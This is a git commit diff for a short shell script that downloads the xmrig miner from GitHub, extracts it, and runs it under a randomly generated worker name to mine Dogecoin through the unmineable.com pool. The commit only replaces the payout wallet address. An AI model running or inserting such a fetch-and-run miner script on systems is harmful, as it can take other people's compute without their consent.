c39ddae525b08ee2c16e1c0df5959de1b88c49af
er1Ha <64760731+er1Ha@users.noreply.github.com>
2022-04-16 23:04:25 +0800

    Update dog.sh

--- dog.sh
+++ dog.sh
@@ -4,5 +4,5 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux
 tar -xzvf xmrig*
 cd xmrig-6.17.0
 hostName=$(date +%s | sha256sum | base64 | head -c 16)
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DPhtjWGFyNpPqAkuU7H8AVnhVKzmpg79Pq.$hostName
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DB4aU3Bdjew8qS7RJTCnhXHXCBB8FepbiJ.$hostName
 
